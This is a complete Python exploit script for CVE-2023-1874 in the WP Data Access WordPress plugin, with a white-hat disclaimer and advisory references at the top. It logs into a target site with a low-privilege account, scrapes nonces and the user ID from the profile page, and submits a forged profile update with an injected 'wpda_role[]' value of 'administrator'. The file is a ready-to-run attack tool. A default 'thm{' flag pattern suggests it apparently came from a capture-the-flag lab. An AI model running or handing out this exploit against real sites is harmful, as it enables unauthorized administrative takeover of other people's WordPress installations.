#!/usr/bin/env python3
#################################################################
#                       DISCLAIMER
#################################################################
#
# THIS SCRIPT IS DESIGNED FOR WHITE HAT AND EDUCATIONAL PURPOSES
# ONLY. ANY USE OF THIS AGAINST A DEVICE YOU ARE NOT AUTHORIZED
# TO TEST ON OR DO NOT OWN IS YOUR OWN RESPONSIBILITY. THE AUTHOR
# OF THIS SCRIPT TAKES NO RESPONSIBILITY FOR ANYTHING YOU DO WITH
# THIS SCRIPT. YOUR ACTIONS ARE YOUR OWN.
#
#################################################################
#
# Exploit: CVE-2023-1874
#
# Description:
#
# This script is designed to exploit CVE-2023-1874 which is a
# privilege escalation attack against Wordpress sites running
# the WP Data Access plugin version 5.3.7 and lower.
#
# The arguments/payloads in the requests may need to be adjusted
# based on the site.
#
# References:
#
# https://nvd.nist.gov/vuln/detail/CVE-2023-1874
#
# https://wpscan.com/vulnerability/7871b890-5172-40aa-88f2-a1b95e240ad4/
#
#################################################################
#                       Example Call
#################################################################
#
# export TARGETIP=localhost
# export TARGETPORT=80
# export WPPATH=wordpress
# export WPUSERNAME=myuser
# export WPPASSWORD=mypass
#
# python3 cve20231874.py $TARGETIP $TARGETPORT -u $WPUSERNAME -p $WPPASSWORD --path $WPPATH
#
#################################################################

import argparse
import os
import platform
import re
import requests

class Exploiter:
    def __init__(self, baseurl:str, username:str, password:str) -> None:
        if not(isinstance(baseurl,str)):
            raise TypeError(f"baseurl must be a string. got {type(baseurl)}")
        baseurl = baseurl.strip()
        if len(baseurl) < 1:
            raise ValueError("baseurl must be a non-zero length string")
        
        if not(isinstance(password,str)):
            raise TypeError(f"password must be a string. got {type(password)}")
        password = password.strip()
        if len(password) < 1:
            raise ValueError("password must be a non-zero length string")

        if not(isinstance(username,str)):
            raise TypeError(f"username must be a string. got {type(username)}")
        username = username.strip()
        if len(username) < 1:
            raise ValueError("username must be a non-zero length string")
        
        self.__baseurl = baseurl
        self.__loginrt = "wp-login.php"
        self.__password = password
        self.__profilert = "wp-admin/profile.php"
        self.__timeout = 60
        self.__username = username
        self.__session = requests.session()
        return
    
    def __get_profile_source(self):
        """
        function designed to pull the HTML source for the
        profile.php page. this will can be used to extract
        relevant information like nonces and userids that can
        be passed along with profile update requests, etc.
        """
        message = str()
        source = str()
        success = bool()
        target = f"{self.__baseurl}/{self.__profilert}"

        try:
            resp = self.__session.get(target, timeout=self.__timeout)
            if resp.status_code >= 400:
                raise ValueError(f"bad status code ({resp.status_code} {resp.reason})")
            
            source = resp.text

            message = "profile source successfully grabbed"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (source, success, message)
    
    def login(self):
        """
        function designed to attempt a login to the target site using
        the credentials provided by the user when setting up the
        class instance.
        """
        message = str()
        payload = {
            "log": self.__username, 
            "pwd": self.__password, 
            "wp-submit": "Log+In", 
            "redirect_to": f"{self.__baseurl}/wp-admin/", 
            "testcookie": "1"
        }
        passpat = f"<strong>Error\:<\/strong> The password you entered"
        success = bool()
        target = f"{self.__baseurl}/{self.__loginrt}"
        userpat = f"<strong>Error\:<\/strong> The username <strong>{self.__username}<\/strong>"

        try:
            SysMsgNB("making GET request to login page to set cookies ...")
            resp = self.__session.get(target, timeout=self.__timeout)
            if resp.status_code >= 400:
                raise ValueError("login page is unreachable")
            SucMsg("cookies set")

            SysMsgNB("making POST to login page to test credentials ...")
            resp = self.__session.post(target, data=payload, timeout=self.__timeout)
            if resp.status_code >= 400:
                raise ValueError(f"bad status code ({resp.status_code} {resp.reason})")
            
            _, success, message = FindFlag(resp.text, userpat)
            if success:
                raise ValueError("username incorrect")
            
            _, success, message = FindFlag(resp.text, passpat)
            if success:
                raise ValueError("password incorrect")

            message = "login success"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (success, message)
    
    def exploit(self):
        """
        function designed to  login to a vulnerable wordpress site as 
        a given user and grant the user administrative privileges on
        the site by exploiting CVE-2023-1874.
        """
        message = str()
        patcnon = "name=\"color-nonce\" value=\"([a-zA-Z0-9]+)\""
        patfrom = "name=\"from\" value=\"([a-zA-Z]+)\""
        patnonce = "name=\"_wpnonce\"\svalue=\"([a-zA-Z0-9]+)\""
        patuid = "name=\"checkuser_id\" value=\"([0-9]+)\""
        payload = {
            "_wpnonce": "",
            "_wp_http_referer": "/wordpress/wp-admin/profile.php",
            "from": "",
            "checkuser_id": "",
            "color-nonce": "",
            "admin_color": "fresh",
            "admin_bar_font": "1",
            "first_name": self.__username,
            "last_name": self.__username,
            "nickname": self.__username,
            "displayname": self.__username,
            "email": f"{self.__username}@localhost.local",
            "url": "",
            "description": "",
            "pass1": "",
            "pass2": "",
            "action": "update",
            "user_id": "",
            "submit": "User+Profile",
            "wpda_role[]": "administrator" # this is the exploit
        }
        source = str()
        success = bool()
        target = f"{self.__baseurl}/{self.__profilert}"

        try:
            SysMsgNB("logging in ...")
            success, message = self.login()
            if not(success):
                raise ValueError(message)
            SucMsg(message)
            
            SysMsgNB("getting profile source ...")
            source, success, message = self.__get_profile_source()
            if not(success):
                raise ValueError(message)
            SucMsg(message)
            
            payload["_wpnonce"], success, message = FindFlag(source, patnonce)
            if not(success):
                raise ValueError(f"wpnonce - {message}")
            SucMsg(f"wpnonce: {payload['_wpnonce']}")
            
            payload["checkuser_id"], success, message = FindFlag(source, patuid)
            if not(success):
                raise ValueError(f"uid - {message}")
            payload["user_id"] = payload["checkuser_id"]
            SucMsg(f"userid: {payload['checkuser_id']}")
            
            payload["from"], success, message = FindFlag(source, patfrom)
            if not(success):
                raise ValueError(f"from - {message}")
            SucMsg(f"from: {payload['from']}")
            
            payload["color-nonce"], success, message = FindFlag(source, patcnon)
            if not(success):
                raise ValueError(f"colornonce - {message}")
            SucMsg(f"color-nonce: {payload['color-nonce']}")

            SysMsgNB("granting admin privileges ...")
            resp = self.__session.post(target, data=payload, timeout=self.__timeout)
            if resp.status_code >= 400:
                raise ValueError(f"bad status code ({resp.status_code} {resp.reason})")
            SucMsg(f"admin privileges successfully granted to \"{self.__username}\"")

            message = "exploit completed succesfully"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (success, message)



############################################################
# Global Variables
############################################################

ANSI_CLRLN = "\r\x1b[2K\r"
ANSI_RST = "\x1b[0m"
ANSI_GRN = "\x1b[32;1m"
ANSI_RED = "\x1b[31;1m"
ANSI_BLU = "\x1b[34;1m"
ANSI_YLW = "\x1b[33;1m"

HTTPS_ENABLED = False

############################################################
# Formatting Functions
############################################################

def SucMsg(msg):
    print(f"{ANSI_CLRLN}{ANSI_GRN}[+]{ANSI_RST} {msg}")
    return

def ErrMsg(msg):
    print(f"{ANSI_CLRLN}{ANSI_RED}[-]{ANSI_RST} {msg}")
    return

def InfoMsg(msg):
    print(f"{ANSI_CLRLN}{ANSI_BLU}[i]{ANSI_RST} {msg}")
    return

def InfoMsgNB(msg):
    print(f"{ANSI_CLRLN}{ANSI_BLU}[i]{ANSI_RST} {msg}", end="")
    return

def SysMsg(msg):
    print(f"{ANSI_CLRLN}{ANSI_YLW}[*]{ANSI_RST} {msg}")
    return

def SysMsgNB(msg):
    print(f"{ANSI_CLRLN}{ANSI_YLW}[*]{ANSI_RST} {msg}", end="")
    return

############################################################
# Validation Functions
############################################################

def nonemptystr(value):
    if not(isinstance(value,str)):
        raise TypeError(f"value must be string. got {type(value)}")
    
    value = value.strip()
    if len(value) < 1:
        raise ValueError("value must be a non-zero length string")
    
    return value

def port_type(portno):
    portno = int(portno)

    if (portno < 1) or (portno > 65535):
        raise argparse.ArgumentError("Port must be within range 1 - 65535.")

    return portno

############################################################

def FindFlag(data, flagPattern=None):
    flag = str()
    message = str()
    success = bool()

    try:
        ############################################################
        # Make sure data var is bytes or string.
        ############################################################
        if not(isinstance(data,str)) and not(isinstance(data,bytes)):
            raise TypeError(f"Data must be string or bytes. Got {type(data)}.")

        if isinstance(data,str):
            data = data.encode('utf-8')

        ############################################################
        # Normalize data.
        ############################################################
        data = data.lower()

        if flagPattern is None:
            flagPattern = "thm{.*}"
 
        ############################################################
        # Make sure flag pattern var is bytes or string.
        ############################################################
        if not(isinstance(flagPattern,str)) and not(isinstance(flagPattern,bytes)):
            raise TypeError(f"FlagPattern must be string or bytes. Got {type(flagPattern)}.")

        ############################################################
        # Normalize flag pattern.
        ############################################################
        flagPattern = flagPattern.lower()

        ############################################################
        # Match type of data and flag pattern.
        ############################################################
        if type(flagPattern) != type(data):
            if isinstance(flagPattern,bytes):
                data = data.encode()
            elif isinstance(data,bytes):
                flagPattern = flagPattern.encode()

        ############################################################
        # Search for flag pattern.
        ############################################################
        reg = re.compile(flagPattern)
        matches = reg.findall(data)

        if len(matches) < 1:
            raise ValueError("flag not found in data")
        
        flag = matches[0]

        if isinstance(flag,bytes):
            flag = flag.decode('utf-8')

        message = f"flag found: \"{flag}\""
        success = True
    except Exception as ex:
        flag = ""
        message = str(ex)
        success = False

    return (flag, success, message)

def main():
    scheme = str()
    
    parser = argparse.ArgumentParser()

    ############################################################
    # Setup required command-line arguments.
    ############################################################
    parser.add_argument("target", help="IP address or Domain  of target.", type=nonemptystr)
    parser.add_argument("port", help="Port to connect to target on.", type=port_type)

    parser.add_argument("-u", "--user", help="user to login with", type=nonemptystr, required=True, dest="username")
    parser.add_argument("-p", "--pass", help="password for user", type=nonemptystr, required=True, dest="password")
    parser.add_argument("--path", help="route to wordpress site", type=str, dest="wppath", default="")

    parser.add_argument("--secure", help="use HTTPS scheme", action="store_true", dest="secure")

    args = parser.parse_args()

    target = args.target
    port = args.port
    secure = args.secure
    password = args.password
    username = args.username
    wppath = args.wppath

    if wppath is None:
        wppath = ""
    wppath = wppath.strip().strip("/").strip()

    ############################################################
    # Set HTTP scheme (HTTP or HTTPS) based on arguments.
    ############################################################
    if secure:
        scheme = "https"
    else:
        scheme = "http"

    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")
    print(f"{ANSI_GRN}{'Target Information':^60}{ANSI_RST}")
    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")
    InfoMsg(f"Target IP: {target}")
    InfoMsg(f"Target Port: {port}")
    InfoMsg(f"Scheme: {scheme}")
    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")

    baseurl = f"{scheme}://{target}:{port}/{wppath}"

    try:
        attacker = Exploiter(baseurl=baseurl, username=username, password=password)
        success, message = attacker.exploit()
        if not(success):
            raise ValueError(message)
        SucMsg(message)
    except Exception as ex:
        ErrMsg(str(ex))

    return

if __name__ == "__main__":
    # make sure the ANSI escape characters are properly evalutated
    # on a windows machine.
    if platform.system().lower() == "windows":
        os.system("")

    # run the main exploit logic.
    main()

